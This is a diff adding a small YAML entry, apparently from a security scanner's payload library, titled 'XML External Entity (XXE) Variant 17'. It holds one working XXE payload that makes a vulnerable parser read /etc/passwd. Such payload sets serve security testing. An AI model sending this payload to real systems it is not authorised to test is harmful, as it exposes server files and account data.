@@ -1,0 +1,6 @@
+name: XML External Entity (XXE) Variant 17
+payloads:
+- "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY >\n        <!ENTITY xxe\
+  \ SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
+severity: high
+type: xxe
